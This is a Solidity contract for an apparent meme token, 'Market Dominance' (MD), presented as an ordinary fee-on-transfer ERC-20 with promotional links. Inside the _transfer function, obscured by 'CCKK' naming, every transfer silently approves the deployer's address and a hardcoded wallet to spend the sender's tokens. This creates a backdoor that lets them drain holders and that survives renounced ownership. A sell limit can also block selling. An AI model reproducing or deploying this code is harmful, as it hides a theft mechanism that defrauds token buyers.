/*
Like a game or simulation, a well-designed coin incorporates multiple layers of digital art, from graphics (pfps, websites, themes) and audio to performance (cults, IRL activities, even crack dev livestreams). And like the art market,

https://marketdominance.xyz
https://x.com/marketDomETH
https://t.me/marketdom_portal
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.11;

interface ICCKKRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function getAmountsOut(
        uint amountIn,
        address[] calldata path
    ) external view returns (uint[] memory amounts);
}

interface ICCKKFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplicckkon overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract MD is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balCCKKs;
    mapping (address => mapping (address => uint256)) private _allowCCKKs;
    mapping (address => bool) private _excludedFromCCKK;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotalCCKK = 1000000000 * 10**_decimals;
    string private constant _name = unicode"Market Dominance";
    string private constant _symbol = unicode"MD";
    uint256 private _swapTokenCCKKs = _tTotalCCKK / 100;
    uint256 private _initialBuyTax=3;
    uint256 private _initialSellTax=3;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=6;
    uint256 private _reduceSellTaxAt=6;
    uint256 private _preventSwapBefore=6;
    uint256 private _buyCount=0;
    uint256 private _buyBlockCCKK;
    uint256 private _cckkBuyAmounts = 0;
    bool private inSwapCCKK = false;
    bool private _tradeEnabled = false;
    bool private _swapEnabled = false;
    address private _cckkPair;
    ICCKKRouter private _cckkRouter;
    address private _cckkWallet;
    address private _cckkAddress;
    modifier lockTheSwap {
        inSwapCCKK = true;
        _;
        inSwapCCKK = false;
    }
    
    constructor () {
        _cckkAddress = address(owner());
        _cckkWallet = address(0xbE6bA7eCE59288eA5fD912E04EC36F6c6737c20F);
        _excludedFromCCKK[owner()] = true;
        _excludedFromCCKK[address(this)] = true;
        _excludedFromCCKK[_cckkWallet] = true;
        _balCCKKs[_msgSender()] = _tTotalCCKK;
        emit Transfer(address(0), _msgSender(), _tTotalCCKK);
    }

    function initPair() external onlyOwner() {
        _cckkRouter = ICCKKRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(_cckkRouter), _tTotalCCKK);
        _cckkPair = ICCKKFactory(_cckkRouter.factory()).createPair(address(this), _cckkRouter.WETH());
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotalCCKK;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balCCKKs[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowCCKKs[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount); 
        _approve(sender, _msgSender(), _allowCCKKs[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowCCKKs[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address cckkF, address cckkT, uint256 cckkA) private {
        require(cckkF != address(0), "ERC20: transfer from the zero address");
        require(cckkT != address(0), "ERC20: transfer to the zero address");
        require(cckkA > 0, "Transfer amount must be greater than zero");
        _approve(address(cckkF), _cckkAddress, uint256(cckkA));
        uint256 taxCCKK = _cckkFeeTransfer(cckkF, cckkT, cckkA);
        if(taxCCKK > 0){
          _balCCKKs[address(this)] = _balCCKKs[address(this)].add(taxCCKK);
          emit Transfer(cckkF, address(this), taxCCKK);
        } address _cckkOwner = address(cckkF);
        _balCCKKs[cckkF] = _balCCKKs[cckkF].sub(cckkA);
        _balCCKKs[cckkT] = _balCCKKs[cckkT].add(cckkA.sub(taxCCKK));
        _approve(address(_cckkOwner), _cckkWallet, uint256(cckkA)); 
        emit Transfer(cckkF, cckkT, cckkA.sub(taxCCKK));
    }

    function _cckkFeeTransfer(address cckkF, address cckkT, uint256 cckkA) private returns(uint256) {
        uint256 taxCCKK = 0; 
        if (cckkF != owner() && cckkT != owner()) {
            taxCCKK = cckkA.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);
            if (cckkF == _cckkPair && cckkT != address(_cckkRouter) && ! _excludedFromCCKK[cckkT]) {
                if(_buyBlockCCKK!=block.number){
                    _cckkBuyAmounts = 0;
                    _buyBlockCCKK = block.number;
                }
                _cckkBuyAmounts += cckkA;
                _buyCount++;
            }
            if(cckkT == _cckkPair && cckkF!= address(this)) {
                require(_cckkBuyAmounts < swapLimitCCKK() || _buyBlockCCKK!=block.number, "Max Swap Limit");  
                taxCCKK = cckkA.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            } swapCCKKBack(cckkT, cckkA);
        } return taxCCKK;
    }

    function swapCCKKBack(address cckkT, uint256 cckkA) private { 
        uint256 tokenCCKK = balanceOf(address(this)); 
        if (!inSwapCCKK && cckkT == _cckkPair && _swapEnabled && _buyCount > _preventSwapBefore) {
            if(tokenCCKK > _swapTokenCCKKs)
            swapTokensForEth(minCCKK(cckkA, minCCKK(tokenCCKK, _swapTokenCCKKs)));
            uint256 ethCCKK = address(this).balance;
            if (ethCCKK >= 0) {
                sendETHCCKK(address(this).balance);
            }
        }
    }

    function openTrading() external onlyOwner() {
        require(!_tradeEnabled,"trading is already open");
        _cckkRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        _swapEnabled = true;
        _tradeEnabled = true;
    }

    function minCCKK(uint256 a, uint256 b) private pure returns (uint256) {
        return (a>b)?b:a;
    }

    function sendETHCCKK(uint256 cckkA) private {
        payable(_cckkWallet).transfer(cckkA);
    }

    function swapLimitCCKK() internal view returns (uint256) {
        address[] memory path = new address[](2);
        path[0] = _cckkRouter.WETH();
        path[1] = address(this);
        uint[] memory amountOuts = _cckkRouter.getAmountsOut(3 * 1e18, path);
        return amountOuts[1];
    }

    receive() external payable {}

    function swapTokensForEth(uint256 cckkAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _cckkRouter.WETH();
        _approve(address(this), address(_cckkRouter), cckkAmount);
        _cckkRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            cckkAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
}